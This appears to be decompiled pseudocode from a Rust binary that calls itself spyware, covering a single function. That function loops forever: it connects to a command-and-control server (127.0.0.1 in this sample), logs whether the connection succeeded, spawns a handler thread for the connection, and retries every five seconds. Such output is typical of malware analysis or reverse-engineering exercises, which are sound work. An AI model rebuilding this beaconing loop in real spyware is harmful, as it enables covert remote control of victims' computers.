void spyware::run_cnc_connection_loop()
{
    unsigned int v0;  // [bp-0x114]
    void* v1;  // [bp-0x110], Other Possible Types: unsigned long long
    unsigned long long v2;  // [bp-0x108]
    char *v3;  // [bp-0x100], Other Possible Types: unsigned long long
    unsigned long long v4;  // [bp-0xf8]
    void* v5;  // [bp-0xf0]
    char v6;  // [bp-0xe8]
    unsigned long long v7;  // [bp-0xe0]
    unsigned long long v8;  // [bp-0xd8]
    unsigned long long v9;  // [bp-0xd0]
    unsigned long long v10;  // [bp-0xc8]
    unsigned long long v11;  // [bp-0xc0]
    char *v12;  // [bp-0xb8], Other Possible Types: unsigned long long
    unsigned long long v13;  // [bp-0xb0]
    unsigned int v14;  // [bp-0xa8]
    unsigned int v15;  // [bp-0xa4]
    unsigned long long v16;  // [bp-0xa0]
    char *v17;  // [bp-0x98]
    unsigned long long v18;  // [bp-0x90]
    char *v19;  // [bp-0x88]
    unsigned long long v20;  // [bp-0x80]
    int v21;  // [bp-0x78]
    unsigned long long v22;  // [bp-0x68]
    int v23;  // [bp-0x60]
    unsigned long long v24;  // [bp-0x50]
    char *v25;  // [bp-0x48]
    unsigned long long v26;  // [bp-0x30]
    unsigned long long v27;  // [bp-0x28]
    unsigned long long v28;  // [bp-0x20]
    unsigned long long v29;  // [bp-0x18]
    unsigned long long v30;  // [bp-0x10]
    unsigned long long v32;  // r15
    unsigned long long v33;  // r14
    unsigned long long v34;  // r13
    unsigned long long v35;  // r12
    unsigned long long v36;  // rbx

    v30 = v32;
    v29 = v33;
    v28 = v34;
    v27 = v35;
    v26 = v36;
    while (true)
    {
        v7 = &g_4b93a8;
        v8 = <&T as core::fmt::Display>::fmt;
        v9 = &g_41281a;
        v10 = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;
        v1 = &g_4b9348;
        v2 = 2;
        v5 = 0;
        v3 = &v7;
        v4 = 2;
        v23.map_or_else(&v1);
        v21 = v23;
        v22 = v24;
        v14.connect(&v21);
        if (((char)v14 & 1))
        {
            v12 = v16;
            if (::0x4514b0::core::sync::atomic::atomic_load())
            {
                v25 = &v21;
                v17 = &v25;
                v18 = <&T as core::fmt::Display>::fmt;
                v19 = &v12;
                v20 = <std::io::error::Error as core::fmt::Display>::fmt;
                v1 = &g_4b9388;
                v2 = 2;
                v5 = 0;
                v3 = &v17;
                v4 = 2;
                v7 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
                v8 = 7;
                v9 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
                v10 = 7;
                v11 = log::__private_api::loc(&g_4b9400);
                log::__private_api::log(&v1, 1, &v7);
            }
            ::0x451200::core::ptr::drop_in_place<std::io::error::Error>(&v12);
        }
        else
        {
            v0 = v15;
            if (::0x4514b0::core::sync::atomic::atomic_load() >= 3)
            {
                v1.peer_addr(&v0);
                v17.unwrap(&v1);
                v25.spec_to_string(&v17);
                v12 = &v25;
                v13 = <alloc::string::String as core::fmt::Display>::fmt;
                v1 = &g_4b9368;
                v2 = 2;
                v5 = 0;
                v3 = &v12;
                v4 = 1;
                v7 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
                v8 = 7;
                v9 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
                v10 = 7;
                v11 = log::__private_api::loc(&g_4b93d0);
                log::__private_api::log(&v1, 3, &v7);
                ::0x4511f0::core::ptr::drop_in_place<alloc::string::String>(&v25);
            }
            v3 = 0x8000000000000000;
            v1 = 0;
            v6 = 0;
            v7.spawn_unchecked(&v1, v0);
            v1.expect(&v7);
            ::0x451170::core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>(&v1);
        }
        std::thread::sleep(5, 0);
        ::0x4511f0::core::ptr::drop_in_place<alloc::string::String>(&v21);
    }
}
